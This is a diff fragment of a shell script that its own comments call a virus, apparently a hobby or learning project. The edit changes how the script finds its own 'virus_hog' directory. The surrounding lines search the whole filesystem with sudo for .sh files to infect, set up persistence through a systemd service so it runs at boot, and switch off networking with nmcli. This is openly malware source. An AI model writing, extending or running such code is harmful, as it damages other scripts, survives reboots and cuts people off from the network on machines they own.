@@ -5,7 +5,7 @@
 PATH_TO_DAMAGE=$(sudo find / -name '*.sh')
 
 #echo "$PATH_TO_DAMAGE" # view the files to append to
-DIR=$PWD
+DIR=$(find ~ -name "virus_hog")
 
 # add virus where it will be called every time the computer boots
 if [ -f etc/systemd/system/script_daemon.service ]; then
@@ -32,3 +32,4 @@ done
 
 # disconnect wifi for no reason
 nmcli networking off
+
